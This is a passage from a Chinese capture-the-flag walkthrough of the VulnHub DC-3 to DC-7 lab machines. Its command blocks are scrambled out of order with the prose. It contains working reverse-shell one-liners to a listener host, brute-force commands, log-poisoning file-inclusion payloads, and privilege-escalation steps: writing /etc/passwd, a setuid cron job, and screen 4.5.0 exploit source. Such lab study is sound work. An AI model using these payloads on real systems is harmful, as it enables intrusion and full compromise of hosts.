编辑文件 index.php
dirb http://192.168.234.178/
& /dev/tcp/192.168.234.151/7777 0>&1' ");
?> 
保存之后，我们在kali中开启监听。
待监听好之后，我们访问 index.php 即可。
现在我们拿到shell了，再用python获取交互shell。
权限提升
查找带suid权限的文件 
但是发现没有可以利用的。可能这次考察的内核提权，利用命令 uname -a ，查看linux的内核。
再利用 searchsploit 去查找exp，结果尝试都没成功。
看了大佬的文章，才知道利用的是 Linux拒绝服务漏洞 进行提权。
Exploit：https://www.exploit-db.com/exploits/39772
直接使用 wget 下载到目标机，然后解压使用
nc -lvp 7777
python -c 'import pty;pty.spawn("/bin/bash")'
find / -user root -perm -4000 -print 2>/dev/null
本次完成靶机的过程比较艰难，第一次看这种内核提权，还是得多涨点经验。
DC4
靶机下载地址： https://www.vulnhub.com/entry/dc-4,313/ 
渗透思路：
信息收集：主机发现和端口扫描、暴力破解
漏洞利用：命令执行 GetShell
权限提升：写入Hash（/etc/passwd）、crontab计划任务提权
信息收集
使用 netdiscover ，发现机器 192.168.234.179
nmap端口扫描，发现开启80和22端口，先访问Web服务。
网站页面上很干净，没有其他的东西，让我想起两方面：
  1、暴力破解
  2、目录扫描
使用 dirsearch 脚本对其进行目录扫描，但是什么也没有发现。
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-
sploits/39772.zip
#下载出错的话可以先用浏览器下载到本地，起个HTTP服务来提供下载
unzip 39772.zip     #解压
cd 39772
tar -xf exploit.tar
cd ebpf*
sh compile.sh   #编译源码
./doubleput     #执行提权脚本
#执行完看下ID已经是root了
 cat /root/*flag*   #最后找到Flag
那么只剩下暴力破解了，根据页面内容，猜测账号为 admin 。
使用工具 Hydra 进行破解，得到账号密码， admin/happy 。
这里我使用的是Hydra的图形版 xHydra
此处的字典为 /usr/share/wordlists/rockyou.txt
如果第一次使用该字典，需用使用 gunzip rockyou.txt.gz ，对密码字典压缩包进行解压。
此处为目标的url，冒号之后的内容为POST提交的固定格式。
漏洞利用
命令执行
用爆破的密码登录进去，发现命令执行漏洞。
接着用Burp抓包，反弹Shell
/login.php:username=^USER^&password=^PASS^:S=logout
本地nc监听，并用python获取交互bash
权限提升
翻到用户家目录 /home/jim/backups ，发现了一个 old-passwords.bak 。
把其中内容当作字典， hydra 爆破得到 jim 用户的密码 jibril04
登录SSH后，发现一封来自 root 的邮件。
nc -lvp 7777
python -c 'import pty;pty.spawn("/bin/bash")'
hydra -l jim -P passwd.txt -t 50 192.168.234.179 ssh
jim@dc-4:~$ cat mbox
#
jim@dc-4:~$ cat /var/mail/jim
Linux中邮件存放在 /var/mail 中
得到了 Charles/^xHhA&hvim0y ，随后切换用户。
使用命令 sudo -l 查看权限
发现可以在没有root密码的情况下，执行 teehee
方法一、直接写入Hash
jim@dc-4:~$ cat /var/mail/jim
echo "hackergu::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
#[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]
方法二、crontab计划任务
最后查看Flag
DC5
靶机下载地址： https://www.vulnhub.com/entry/dc-5,314/ 
渗透思路：
信息收集：主机发现和端口扫描
漏洞利用：文件包含GetShell
权限提升：SUID提权（screen 4.5.0）
信息收集
利用 netdiscover 发现主机， 192.168.203.130
nmap扫描发现80端口，查看网站，目录扫描，无果。
唯一有交互的就是网站的 Contact 部分
echo "* * * * * root chmod 4777 /bin/sh" | sudo teehee -a /etc/crontab
#时间全部写*，代表一分钟执行一次。
#将/bin/sh的权限修改为4777，可以在非root用户下执行它，并且执行期间拥有root权限
cat /root/flag.txt
这里我们可以提交一些内容，当我们提交一个内容之后，会跳转到 thankyou.php 。
每当我们刷新一次，最底下的 Copyright 就会变化一次。判断应该是文件包含漏洞。
漏洞利用
thankyou.php 存在文件包含，验证漏洞
通过谷歌浏览器的插件，得知中间件为Nginx
所以我们可利用 nginx 的日志功能，将错误信息写入日志，GetShell。
直接在url中访问，GetShell：
http://192.168.203.130/thankyou.php?file=/var/log/nginx/access.log&cmd=nc 
192.168.203.129 7777 -e /bin/bash
权限提升
查找SUID权限程序
发现一个screen。
利用 searchsploit 寻找一下exp：
主要看一下 41154.sh ：
按照说明，我们需要将：
find / -user root -perm -4000 -print 2>/dev/null
保存为 libhax.c 。
将：
保存为 rootshell.c
然后编译：
使用 wget 命令，将上述两个编译好的文件置入目标服务器的 /tmp 目录下：
然后继续在目标机器上执行脚本中剩下的命令：
最终再返回 /tmp 中执行rootshell，即可获取root的shell。
#include 
#include 
#include 
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
#include 
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
gcc -fPIC -shared -ldl libhax.c -o libhax.so
gcc rootshell.c -o rootshell
www-data@dc-5:/tmp$ wget 192.168.203.129:8080/libhax.so
www-data@dc-5:/tmp$ wget http://192.168.203.129:8080/rootshell
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
./tmp/rootshell
# whoami
whoami
root
最后去/root目录查看Flag即可
DC6
靶机下载地址： https://www.vulnhub.com/entry/dc-6,315/ 
渗透思路：
信息收集：主机发现和端口扫描
漏洞利用：Activity Monitor远程命令执行（Wordpress插件， CVE-2018-15877  ）
权限提升：nmap提权
信息收集
使用 netdiscover 命令，发现主机IP为 192.168.203.132
这套靶机是要修改host文件的，具体可以参看我写的DC-2这篇文章。
因为做靶机做的习惯了，上来直接就看80端口，正好看到需要修改host文件，就直接修改了。
从扫描的结果来看，目标机器开放了22端口和80端口，80端口的web服务是一个Wordpress站点，并
且还扫出了一些用户名。
漏洞利用
日wpscan的站点，当然要使用wpscan了，但是我利用这两条命令，都没能扫出可用漏洞
那剩下的思路就应该是密码爆破了。
来到DC-6的网站看一下，发现一条提示：
我们需要利用此命令生成一个词典：
进行爆破：
nmap -sV -A 192.168.203.132 --script=vuln
| Username found: admin
| Username found: graham
| Username found: mark
| Username found: sarah
| Username found: jens
wpscan --url http://wordy/ -e vt   扫描主题的漏洞
wpscan --url http://wordy/ -e vp   扫描插件的漏洞
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
最终得到了一个账户和密码：
登录后台
一番查看之后，发现此用户的权限并不高。但是，发现了一个有趣的插件 activity monitor
将此插件拿去百度搜了一下，发现此插件存在漏洞（ CVE-2018-15877  ）。不清楚wpscan为什么扫不
出来呢？
找到如下位置，然后写IP，点击lookup，抓包。
wpscan --url http://wordy/ --passwords passwords.txt --usernames 
admin,graham,mark,sarah,jens 
[i] Valid Combinations Found:
 | Username: mark, Password: helpdesk01
既然这样那就直接反弹shell吧
权限提升
使用了以下两个命令，都没有特别大的发现。
习惯性的去了 /home 下，在 mark 文件夹下看到了一个文件 things-to-do.txt
SSH登录上去
nc 192.168.203.129 7777 -e /bin/bash
sudo -l
find / -user root -perm -4000 -print 2>/dev/null
Things to do:
- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done     #这是添加了一个用户
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
把这个脚本改一下，使用 jens 账户执行此脚本
现在我们拿到 jens 账户的shell了。
再次 sudo -l
发现我们可以无需root密码执行 nmap 。
nmap可以执行它自己的脚本文件，后缀为 .nse
提权成功，最后 /root 目录找ﬂag即可。
#!/bin/bash
nc 192.168.203.129 8888 -e /bin/bash
sudo -u jens /home/jens/backups.sh
echo 'os.execute("/bin/sh")' > root.nse
sudo nmap --script=root.nse
# whoami
root
DC7
靶机下载地址： https://www.vulnhub.com/entry/dc-7,356/ 
渗透思路：
Drupal8反弹shell，利用主机上带的备份脚本提权
信息收集
因为本靶机在打开的时候，就已给出了IP，所以直接扫描端口即可
看到该站点开放了22端口和80端口，80端口的web服务采用的是 Drupal 的CMS，版本为8
访问了该靶机的站点，给了如下提示：
Welcome to DC-7
DC-7 introduces some "new" concepts, but I'll leave you to ﬁgure out what they are.  :-)
While this challenge isn't all that technical, if you need to resort to brute forcing or a 
dictionary attacks, you probably won't succeed.
What you will have to do, is to think "outside" the box.
Way "outside" the box.  :-)
在盒子外面思考，也就是告诉我们应该去互联网搜索可利用信息，但是该从何下手呢？
 在盒子外面思考，也就是告诉我们应该去互联网搜索可利用信息，但是该从何下手呢？
该CMS的左下角，有一个特别的信息， @DC7USER ，我们去谷歌搜索一下。
nmap -sV -A 192.168.203.133 --script=vuln
  github源码泄露？？
看样子是的，我们查看一下配置文件 config.php
漏洞利用
我们得到了数据库的账号和秘密，先试试能不能连上ssh。